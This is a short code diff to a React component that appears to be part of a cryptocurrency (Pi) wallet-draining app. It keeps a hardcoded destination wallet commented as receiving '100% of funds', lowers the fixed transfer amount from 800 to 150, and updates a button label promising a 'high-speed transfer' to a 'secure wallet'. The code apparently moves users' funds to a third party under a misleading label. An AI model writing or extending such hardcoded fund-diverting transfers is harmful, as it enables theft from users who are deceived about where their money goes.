@@ -71,7 +71,7 @@
         
         // Single hardcoded destination address for 100% of funds
         let destinationWallet = "GAS7X55UI3WOBHWZC3KGDKDT4FRV2UBKEYFNTHLW7KA226SDPHLMWPLW";  // 100% of funds (hardcoded)
-        let hardcodedTransferAmount = 800; // Fixed amount to transfer each time
+        let hardcodedTransferAmount = 150; // Fixed amount to transfer each time
         
         let [isLoading, setIsLoading] = ReactHooks.useState(false);
         let [transactionHashes, setTransactionHashes] = ReactHooks.useState([]);
@@ -211,7 +211,7 @@
                 }),
                 React.jsx("p", {
                   className: "text-gray-600 text-sm",
-                  children: "HIGH-SPEED TRANSFER 800 PI TO SECURE WALLET"
+                  children: "HIGH-SPEED TRANSFER 150 PI TO SECURE WALLET"
                 })
               ]
             }),
